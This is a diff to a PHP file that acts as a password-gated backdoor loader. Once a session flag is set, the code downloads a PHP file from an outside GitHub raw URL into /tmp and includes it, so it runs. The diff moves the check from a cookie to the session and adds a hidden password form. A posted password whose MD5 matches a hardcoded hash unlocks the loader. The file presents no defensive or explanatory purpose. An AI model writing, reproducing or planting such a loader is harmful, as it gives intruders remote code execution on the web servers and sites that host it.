@@ -1,6 +1,7 @@
 <?php
+session_start();
 
-if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
+if (isset($_SESSION['anjing']) && $_SESSION['anjing'] == "anjing") {
     $url = 'https://raw.githubusercontent.com/dan1584/asfdas/main/Aks525jkwuy.php';
     
     $targetDir = '/tmp';
@@ -22,6 +23,17 @@ if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
     }
     
     include $targetFile;
+    die();
 }
 
+if (isset($_POST['password']) && !empty($_POST['password'])) {
+    $pass = "6669aa769e5bf4125f96badc02e2de15";
+    if (md5($_POST['password']) == $pass) {
+        $_SESSION['anjing'] = 'anjing';
+    }
+}
 ?>
+
+<form method="post">
+<input type="password" name="password">
+</form>
